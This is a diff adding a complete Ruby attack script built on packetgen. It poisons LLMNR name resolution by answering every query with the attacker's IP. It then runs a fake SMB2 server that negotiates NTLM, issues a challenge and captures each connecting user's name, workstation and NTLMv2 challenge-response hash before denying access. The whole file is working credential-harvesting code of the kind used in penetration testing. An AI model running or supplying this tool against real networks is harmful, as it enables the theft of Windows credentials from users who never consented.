@@ -1,0 +1,322 @@
+#!/usr/bin/env ruby
+
+# frozen_string_literal: true
+
+require 'optparse'
+require 'socket'
+require 'ipaddr'
+require 'securerandom'
+require 'ostruct'
+
+require 'packetgen'
+require 'packetgen-plugin-smb'
+
+BIND_ADDR = '0.0.0.0'
+
+DOMAIN_NAME = 'SMB3'
+COMPUTER_NAME = 'WIN-AZE546CFHTD'
+
+Thread.abort_on_exception = true
+
+Credentials = Struct.new(:user, :computer, :challenge, :proof, :response, :ip) do
+  def to_s
+    str = "User: #{user}\nComputer:#{computer} (IP: #{ip})\n"
+    str << "Challenge: #{challenge}\nProof: #{proof}\n"
+    str << "Response: #{response}"
+  end
+end
+
+class PacketGen::Packet
+  def ===(other)
+    case other
+    when PacketGen::Packet
+      self == other
+    when String
+      is? other
+    else
+      false
+    end
+  end
+end
+
+class LlmnrResponder
+  attr_reader :socket, :my_ip, :my_ip_data
+
+  LLMNR_MCAST_ADDR = '224.0.0.252'
+  BIND_ADDR = '0.0.0.0'
+
+  def initialize
+    @socket = UDPSocket.new
+  end
+
+  def start(bind_addr:, iface:)
+    @my_ip = Interfacez.ipv4_address_of(iface)
+    @my_ip_data = IPAddr.new(my_ip).hton
+    configure_multicast(my_ip_data)
+
+    socket.bind(bind_addr, PacketGen::Plugin::LLMNR::UDP_PORT)
+
+    start_thread
+  end
+
+  private
+
+  def log(str)
+    puts "[LLMNR] #{str}"
+  end
+
+  def configure_multicast(local_ip_bin)
+    mreq = IPAddr.new(LLMNR_MCAST_ADDR).hton + local_ip_bin
+    socket.setsockopt(:IPPROTO_IP, :IP_ADD_MEMBERSHIP, mreq)
+  end
+
+  def start_thread
+    Thread.new do
+      loop do
+        data, peer = socket.recvfrom(1024)
+        pkt = PacketGen.parse(data, first_header: 'LLMNR')
+        next unless pkt.is?('LLMNR')
+
+        peer_port = peer[1]
+        peer_ip = peer[3]
+        log "received LLMNR request from #{peer_ip}"
+
+        # Forge LLMNR response
+        pkt.llmnr.qr = true
+        pkt.llmnr.qd.each do |question|
+          next unless (question.human_rrclass == 'IN') && (question.human_type == 'A')
+
+          log "Say to #{peer_ip} #{question.name} is #{my_ip}"
+          pkt.llmnr.an << { rtype: 'RR', name: question.name, rdata: my_ip_data }
+        end
+        pkt.calc
+
+        next unless pkt.llmnr.ancount > 0
+
+        socket.send(pkt.to_s, 0, peer_ip, peer_port)
+      end
+    end
+  end
+end
+
+class Smb2Responder
+  attr_reader :socket, :guid, :salt
+
+  NTLMSSP_OID = '1.3.6.1.4.1.311.2.2.10'
+  STATUS_MORE_PROCESSING_REQUIRED = 0xc0000016
+  STATUS_ACCESS_DENIED = 0xc0000022
+
+  SMB2_SIZE = 8_388_608
+  SMB2_NEGO_RESP_BUFFER = "`\x82\x01<\x06\x06+\x06\x01\x05\x05\x02\xA0\x82\x0100\x82\x01,\xA0\x1A0\x18\x06\n+\x06\x01\x04\x01\x827\x02\x02\x1E\x06\n+\x06\x01\x04\x01\x827\x02\x02\n\xA2\x82\x01\f\x04\x82\x01\bNEGOEXTS\x01\x00\x00\x00\x00\x00\x00\x00`\x00\x00\x00p\x00\x00\x00C%\xB9`\x18\xCE\xC8\xA9\xB7\xB7W\x9B\xC1J\xF5\xC0\x7F\x15\x93\x15k\xE5\x88\n\x9A\\\x9A\xD6\x9EK`\x81\a\xEF\xF7f\xF6\x80\xAA\x17\xE0\xC2\xC5\xE5\xDB\x05\\\v\x00\x00\x00\x00\x00\x00\x00\x00`\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\3S\r\xEA\xF9\rM\xB2\xECJ\xE3xn\xC3\bNEGOEXTS\x03\x00\x00\x00\x01\x00\x00\x00@\x00\x00\x00\x98\x00\x00\x00C%\xB9`\x18\xCE\xC8\xA9\xB7\xB7W\x9B\xC1J\xF5\xC0\\3S\r\xEA\xF9\rM\xB2\xECJ\xE3xn\xC3\b@\x00\x00\x00X\x00\x00\x000V\xA0T0R0'\x80%0#1!0\x1F\x06\x03U\x04\x03\x13\x18Token Signing Public Key0'\x80%0#1!0\x1F\x06\x03U\x04\x03\x13\x18Token Signing Public Key"
+  SMB2_SALT_LEN = 32
+
+  def initialize
+    @guid = SecureRandom.uuid
+    @salt = SecureRandom.random_bytes(SMB2_SALT_LEN)
+  end
+
+  def start(bind_addr:)
+    @socket = TCPServer.new(bind_addr, PacketGen::Plugin::NetBIOS::Session::TCP_PORT2)
+
+    start_loop
+  end
+
+  private
+
+  def log(str)
+    puts "[SMB2] #{str}"
+  end
+
+  def get_smb_data(sock)
+    PacketGen.parse(sock.recv(1024), first_header: 'NetBIOS::Session')
+  end
+
+  def smb2_nego_resp1
+    return @pkt if defined? @pkt
+
+    @pkt = PacketGen.gen('NetBIOS::Session')
+                    .add('SMB2', credit: 1)
+                    .add('SMB2::Negotiate::Response', dialect: 0x2ff, server_guid: guid, capabilities: 7, max_trans_size: SMB2_SIZE, max_read_size: SMB2_SIZE, max_write_size: SMB2_SIZE)
+    @pkt.smb2_negotiate_response[:buffer] = PacketGen::Types::String.new.read(SMB2_NEGO_RESP_BUFFER)
+    @pkt.calc
+    @pkt
+  end
+
+  def first_nego_response
+    pkt = smb2_nego_resp1
+    pkt.smb2_negotiate_response[:system_time] = PacketGen::Plugin::SMB::Filetime.now
+    pkt
+  end
+
+  def second_nego_response(req_pkt)
+    smb2_req = req_pkt.smb2
+    nego_req = req_pkt.smb2_negotiate_request
+
+    pkt = PacketGen.gen('NetBIOS::Session').add('SMB2', credit: 1, message_id: smb2_req.message_id, reserved: smb2_req.reserved)
+
+    pkt.add('SMB2::Negotiate::Response', dialect: nego_req.dialects.last,
+            server_guid: guid, capabilities: 0x2f, max_trans_size: SMB2_SIZE,
+            max_read_size: SMB2_SIZE, max_write_size: SMB2_SIZE)
+    pkt.smb2_negotiate_response[:system_time] = PacketGen::Plugin::SMB::Filetime.now
+    pkt.smb2_negotiate_response[:buffer] = PacketGen::Types::String.new.read(SMB2_NEGO_RESP_BUFFER)
+
+    pkt.smb2_negotiate_response.context_list << { type: 1, salt_length: SMB2_SALT_LEN, salt: salt }
+    pkt.smb2_negotiate_response.context_list.last.hash_alg << PacketGen::Types::Int16le.new(1)
+
+    pkt.smb2_negotiate_response.context_list << { type: 2 }
+    pkt.smb2_negotiate_response.context_list.last.ciphers << PacketGen::Types::Int16le.new(1)
+    pkt.calc
+    pkt
+  end
+
+  def first_session_setup_response(req_pkt)
+    smb2_req = req_pkt.smb2
+    setup_req = req_pkt.smb2_sessionsetup_request
+    ntlm_nego = PacketGen::Plugin::NTLM.read(setup_req.buffer[:token_init][:mech_token].value)
+
+    pkt = PacketGen.gen('NetBIOS::Session')
+    pkt.add('SMB2', credit_charge: 1, credit: 1, status: STATUS_MORE_PROCESSING_REQUIRED,
+                    message_id: smb2_req.message_id, reserved: smb2_req.reserved)
+    pkt.add('SMB2::SessionSetup::Response')
+
+    ntlm = PacketGen::Plugin::NTLM::Challenge.new
+    ntlm.flags = ntlm_nego.flags | 0x00810000
+    ntlm.flags &= 0xfdffff15
+    ntlm.challenge = [rand(2**64)].pack('q<')
+    ntlm.target_name.read('SMB3')
+    ntlm.target_info << { type: 'DomainName', value: DOMAIN_NAME }
+    ntlm.target_info << { type: 'ComputerName', value: COMPUTER_NAME }
+    ntlm.target_info << { type: 'DnsDomainName', value: "#{DOMAIN_NAME}.local" }
+    ntlm.target_info << { type: 'DnsComputerName', value: "#{COMPUTER_NAME}.local" }
+    ntlm.target_info << { type: 'DnsTreeName', value: "#{DOMAIN_NAME}.local" }
+    ntlm.target_info << { type: 'Timestamp', value: PacketGen::Plugin::SMB::Filetime.now.to_human }
+    ntlm.target_info << { type: 'EOL' }
+    ntlm.calc_length
+    gssapi = pkt.smb2_sessionsetup_response.buffer
+    gssapi[:token_resp][:response].value = ntlm.to_s
+    gssapi[:token_resp][:negstate].value = 'accept-incomplete'
+    gssapi[:token_resp][:supported_mech] = NTLMSSP_OID
+    pkt.calc
+    [pkt, ntlm.challenge]
+  end
+
+  def deny_access(req_pkt)
+    smb2_req = req_pkt.smb2
+    pkt = PacketGen.gen('NetBIOS::Session')
+    pkt.add('SMB2', credit: 1, credit_charge: 1, status: STATUS_ACCESS_DENIED,
+                    message_id: smb2_req.message_id, reserved: smb2_req.reserved)
+    pkt.add('SMB2::SessionSetup::Response')
+    pkt.smb2_sessionsetup_response[:buffer] = PacketGen::Types::String.new
+    pkt.calc
+    pkt
+  end
+
+  def start_loop
+    loop do
+      client = socket.accept
+      closed = false
+
+      log "connection from #{client.peeraddr[2]}"
+
+      credentials = Credentials.new
+      credentials.ip = client.peeraddr.last
+      p credentials
+
+      until closed
+        rcv_pkt = get_smb_data(client)
+        p rcv_pkt
+
+        pkt_to_send = case rcv_pkt.headers.last.protocol_name
+                      when 'SMB::Negotiate::Request'
+                        unless rcv_pkt.smb_negotiate_request.dialects.map(&:to_human).include?('SMB 2.???')
+                          closed = true
+                          nil
+                        end
+
+                        first_nego_response
+
+                      when 'SMB2::Negotiate::Request'
+                        second_nego_response rcv_pkt
+
+                      when 'SMB2::SessionSetup::Request'
+                        gssapi = rcv_pkt.smb2_sessionsetup_request.buffer
+                        p gssapi
+                        puts gssapi[:token_resp][:response].class
+                        if gssapi[:token_init][:mech_types].value.map(&:value).include?(NTLMSSP_OID)
+                          pkt, challenge = first_session_setup_response(rcv_pkt)
+                          credentials.challenge = challenge
+                          pkt
+                        else
+                          response = PacketGen::Plugin::NTLM.read(gssapi[:token_resp][:response].value)
+                          if response.is_a?(PacketGen::Plugin::NTLM::Authenticate)
+                            credentials.proof = binary2hex(response.nt_response.response)
+                            credentials.user = response.user_name
+                            credentials.computer = response.workstation
+                            credentials.response = binary2hex(response.nt_response.to_s[credentials.proof.size..-1])
+                            closed = true
+                            deny_access rcv_pkt
+                          else
+                            closed = true
+                            nil
+                          end
+                        end
+                      end
+
+        client.send(pkt_to_send.to_s, 0) if pkt_to_send
+        client.close if closed
+        puts "closed: #{closed.inspect}"
+        p pkt_to_send
+      end
+    end
+  end
+
+  def binary2hex(str)
+    str.unpack('H*').first
+  end
+end
+
+def log(section, str)
+  puts "[#{section}] #{str}"
+end
+
+def log_smb2(str)
+  log 'SMB2', str
+end
+
+def log_llmnr(str)
+  log 'LLMNR', str
+end
+
+def parse_options
+  options = {}
+
+  OptionParser.new do |opts|
+    opts.banner = "Usage: #{$PROGRAM_NAME} [options]"
+    opts.separator ''
+    opts.separator 'Options:'
+
+    opts.on_tail('-h', '--help', 'Show this message') do
+      puts opts
+      exit
+    end
+
+    opts.on('-i IFACE', '--interface IFACE', 'interface on which responds') do |iface|
+      options[:iface] = iface
+    end
+  end.parse!
+
+  options
+end
+
+def check_options(options)
+  raise 'No interface given' if options[:iface].nil?
+  raise "unknown interface #{options[:iface]}" unless Interfacez.all.include? options[:iface]
+end
+
+options = parse_options
+
+check_options options
+
+LlmnrResponder.new.start(bind_addr: BIND_ADDR, iface: options[:iface])
+
+Smb2Responder.new.start(bind_addr: BIND_ADDR)
